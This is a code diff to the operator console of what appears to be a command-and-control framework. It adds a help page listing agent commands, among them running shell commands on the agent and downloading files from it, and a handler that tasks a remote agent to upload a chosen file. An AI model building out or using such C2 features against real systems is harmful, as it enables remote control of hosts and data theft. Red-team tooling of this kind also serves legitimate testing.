@@ -51,6 +51,18 @@ export const setupWS = (httpServer) => {
     socketObjects[username] = client;
     output(`New ws connection for ${username}: ${client.id}`);
 
+    // Console help page.
+    const helpPage = "  COMMAND                FUNCTION\n"+
+                     "  -------                --------\n\n"+
+                     "  clear                  Clear console output\n"+
+                     "  delete agent           Delete agent\n"+
+                     "  delete task <id>       Delete a task\n"+
+                     "  download <file>        Download a file from the agent\n"+
+                     "  freeze                 Freeze/stop agent from receiving tasks\n"+
+                     "  unfreeze               Unfreeze agent\n"+
+                     "  system <cmd>           Run a shell command on the agent\n"+
+                     "  help/?                 Print this help page\n";
+
     /**
      * For processing raw agent console inputs from users. 
      * Note that some inputs are handled completely in the client side.
@@ -66,7 +78,12 @@ export const setupWS = (httpServer) => {
           agentID,
           msg: `${username} > ${input}`
         });
-        if (input.startsWith("system ")){ // Create a system command task
+        if (input === "help" || input === "?"){
+          client.emit("agent_console_output", {
+            agentID,
+            msg: helpPage
+          });
+        }else if (input.startsWith("system ")){ // Create a system command task
           let cmd = input.substr(7).trim();
           const taskData = {
             agentID,
@@ -97,10 +114,17 @@ export const setupWS = (httpServer) => {
           }).catch(error => {
             socketServer.emit("striker_error", error.message);
           });
+        }else if (input.startsWith("download ")){ // Task an agent to upload a file to the server.
+          let filename = input.substr(9).trim();
+          taskModel.createTask(username, {
+            agentID, taskType: "download", data: {file: filename}
+          }).catch(error => {
+            socketServer.emit("striker_error", error.message);
+          });
         }else{ // Unknown query
           socketServer.emit("agent_console_output", {
             agentID,
-            msg: serverPrompt + "Unknown command " + input
+            msg: serverPrompt + "Unknown command: " + input
           });
         }
       }catch(error){
